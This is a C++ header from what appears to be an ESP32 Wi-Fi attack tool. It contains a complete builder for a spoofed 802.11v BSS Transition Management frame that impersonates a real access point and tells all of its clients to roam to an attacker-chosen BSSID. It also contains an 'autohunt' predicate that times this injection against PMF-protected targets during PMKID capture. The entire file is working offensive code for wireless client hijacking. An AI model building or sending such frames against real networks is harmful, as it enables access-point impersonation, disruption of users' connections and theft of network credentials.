#pragma once

/**
 * @file btm_frame.h
 * @brief Pure builder for a spoofed 802.11v BSS Transition Management Request
 *        (WNM action frame), plus the autohunt one-shot injection predicate.
 *
 * Header-only on purpose: the builder is pure and native-testable (slice-0155),
 * and keeping the predicate next to the bytes keeps the policy and the frame
 * contract visible together. The ESP32-side TX helper lives in
 * btm_frame_tx.h/.cpp to keep this file free of radio headers so the native
 * test can `#include` it without pulling the Arduino/ESP-IDF world.
 *
 * Frame layout (ADR-0153, slice-0155):
 *   MAC header     24 bytes   FC | Duration | DA | SA | BSSID | SeqCtl
 *   WNM body        7 bytes   Category(10) | Action(7) | DialogToken(1)
 *                             | RequestMode(1) | DisassocTimer(2 LE)
 *                             | ValidityInterval(1)
 *   Neighbor Rpt   15 bytes   TagID(52) | Len(13) | CandidateBSSID(6)
 *                             | BSSIDInfo(4 LE) | OpClass(1) | Channel(1)
 *                             | PHYType(1)
 *   TOTAL          46 bytes
 */

#include <cstddef>
#include <cstdint>
#include <cstring>

namespace adversary::utils {

/// Bit positions in the BTM Request Mode byte (IEEE 802.11-2020 §9.6.13.9).
enum class BtmRequestModeBit : uint8_t {
    PreferredCandidateListIncluded = 0x01,  ///< bit 0
    Abridged                       = 0x02,  ///< bit 1
    DisassociationImminent         = 0x04,  ///< bit 2
    BssTerminationIncluded         = 0x08,  ///< bit 3
    EssDisassociationImminent      = 0x10,  ///< bit 4
};

/// Parameters for a one-shot BTM Request injection.
struct BtmRequestParams {
    const uint8_t* targetBssid;   ///< Source + BSSID of the spoofed frame (the real AP we impersonate).
    const uint8_t* destMac;       ///< Usually the 6-byte broadcast MAC so every associated client sees it.
    const uint8_t* candidateBssid;///< 6-byte BSSID the clients are told to roam to.
    uint8_t  dialogToken;         ///< Nonzero per IEEE 802.11-2020 §9.6.13.9.
    uint8_t  requestMode;         ///< OR of BtmRequestModeBit values.
    uint16_t disassocTimerTu;     ///< TUs until the AP (supposedly) disassociates us.
    uint8_t  validityIntervalBi;  ///< Beacon intervals the candidate list stays valid.
    uint8_t  candidateOpClass;    ///< Operating class of the candidate.
    uint8_t  candidateChannel;    ///< Channel number of the candidate.
    uint8_t  candidatePhyType;    ///< PHY Type octet (see 802.11-2020 Annex C).
};

constexpr size_t kBtmRequestFrameSize = 46;

namespace btm_detail {
    constexpr uint8_t  kFcSubtypeAction  = 0xD0;  ///< Type=Mgmt(00), Subtype=Action(1101) -> 0xD0 in byte 0.
    constexpr uint8_t  kWnmCategory      = 10;
    constexpr uint8_t  kBtmRequestAction = 7;
    constexpr uint8_t  kNeighborReportTagId = 52;
    constexpr uint8_t  kNeighborReportBodyLen = 13;  // 6 BSSID + 4 BSSID info + 1 OpClass + 1 Chan + 1 PHY
}

/**
 * @brief Build a WNM BSS Transition Management Request frame.
 *
 * @param buffer     Output buffer; must be at least kBtmRequestFrameSize bytes.
 * @param bufferSize Buffer capacity.
 * @param p          Frame parameters; every pointer must be non-null.
 * @return Bytes written on success; 0 on any parameter or capacity failure.
 */
inline size_t buildBtmRequestFrame(uint8_t* buffer,
                                   size_t bufferSize,
                                   const BtmRequestParams& p) {
    if (buffer == nullptr) return 0;
    if (bufferSize < kBtmRequestFrameSize) return 0;
    if (p.targetBssid == nullptr || p.destMac == nullptr || p.candidateBssid == nullptr) return 0;

    std::memset(buffer, 0, kBtmRequestFrameSize);

    // --- 802.11 MAC header (24 bytes) ---
    // Frame Control
    buffer[0] = btm_detail::kFcSubtypeAction;
    buffer[1] = 0x00;
    // Duration
    buffer[2] = 0x00;
    buffer[3] = 0x00;
    // Address 1: destination
    std::memcpy(&buffer[4], p.destMac, 6);
    // Address 2: source (the spoofed AP)
    std::memcpy(&buffer[10], p.targetBssid, 6);
    // Address 3: BSSID (also the spoofed AP)
    std::memcpy(&buffer[16], p.targetBssid, 6);
    // Sequence Control
    buffer[22] = 0x00;
    buffer[23] = 0x00;

    // --- WNM action body (7 bytes starting at offset 24) ---
    buffer[24] = btm_detail::kWnmCategory;
    buffer[25] = btm_detail::kBtmRequestAction;
    buffer[26] = p.dialogToken;
    buffer[27] = p.requestMode;
    buffer[28] = static_cast<uint8_t>(p.disassocTimerTu & 0xFF);
    buffer[29] = static_cast<uint8_t>((p.disassocTimerTu >> 8) & 0xFF);
    buffer[30] = p.validityIntervalBi;

    // --- Neighbor Report IE (15 bytes starting at offset 31) ---
    buffer[31] = btm_detail::kNeighborReportTagId;
    buffer[32] = btm_detail::kNeighborReportBodyLen;
    std::memcpy(&buffer[33], p.candidateBssid, 6);   // BSSID (offset 33..38)
    // BSSID Info (4 bytes LE, left zeroed: no reachability/security hints).
    // Offsets 39..42 already zero from the memset above.
    buffer[43] = p.candidateOpClass;
    buffer[44] = p.candidateChannel;
    buffer[45] = p.candidatePhyType;

    return kBtmRequestFrameSize;
}

/// Inputs to the one-shot autohunt BTM injection decision.
struct BtmInjectInputs {
    bool pmfRequired;        ///< The target advertises MFPR=1.
    bool steerEnabled;       ///< The operator turned the (unverified) knob on.
    bool alreadyInjected;    ///< This target already received its one BTM this cycle.
    bool halfWindowElapsed;  ///< The solicitation window's first half has elapsed.
    bool armsSolicitation;   ///< The effective strategy arms PMKID (BTM is meaningless under Deauth-only / Skipped).
};

/**
 * @brief Pure predicate: inject a BTM Request on this target right now?
 *
 * The autohunt FSM reads this at every ATTACKING tick so the decision cells
 * stay native-testable (slice-0155). Defined true only in the exact DoD cell;
 * every other combination returns false, which is what pins the "default off"
 * and "non-PMF skip" behaviours.
 */
inline bool shouldInjectBtm(const BtmInjectInputs& in) {
    return in.steerEnabled
        && in.pmfRequired
        && in.armsSolicitation
        && in.halfWindowElapsed
        && !in.alreadyInjected;
}

}  // namespace adversary::utils
